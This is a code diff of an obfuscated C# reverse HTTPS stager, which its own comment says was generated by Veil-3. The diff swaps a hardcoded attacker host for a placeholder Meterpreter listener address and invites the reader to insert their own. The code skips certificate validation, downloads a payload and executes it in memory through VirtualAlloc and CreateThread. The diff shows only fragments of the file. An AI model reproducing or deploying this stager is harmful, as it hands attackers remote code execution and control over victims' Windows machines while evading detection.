@@ -1,3 +1,4 @@
+// generated from Veil-3 Evasive Pure C# reverse https stager... change to your address below
 using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading;
 namespace xjQqSimmnIFz { public class YmNiEBzRInKffN {
 private static bool rKaaDAHoYtrkcjK(object sender, System.Security.Cryptography.X509Certificates.X509Certificate cert,System.Security.Cryptography.X509Certificates.X509Chain chain,System.Net.Security.SslPolicyErrors sslPolicyErrors) { return true; }
@@ -35,7 +36,7 @@ static void nhdKiVYCLROnBqf(byte[] XLdxAK) {
         WaitForSingleObject(uMmUbgPCpJVC, 0xFFFFFFFF); }}
 public YmNiEBzRInKffN(){
 Random FntKZExTqHecQy = new Random((int)DateTime.Now.Ticks);
-byte[] GSbedkEeKItWO = JfDAlv("https://kali.cyberintel.space:443/" + pidadEf(FntKZExTqHecQy));
+byte[] GSbedkEeKItWO = JfDAlv("https://your.ssl.meterpreter.listener:443/" + pidadEf(FntKZExTqHecQy));
 nhdKiVYCLROnBqf(GSbedkEeKItWO);}
 [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 FzMVHI,UInt32 pKRhGFLYGMoCYo, UInt32 HcVlhqxK, UInt32 wQTrjeEpsmHS);
 [DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 QnPKYNaQkhLuhF, UInt32 ASWvnJvbtwCgn, UInt32 iEPvSWWFOqMS,IntPtr HtbScQcrBzrI, UInt32 cqrWduAQH, ref UInt32 ULhBLXKFVq);
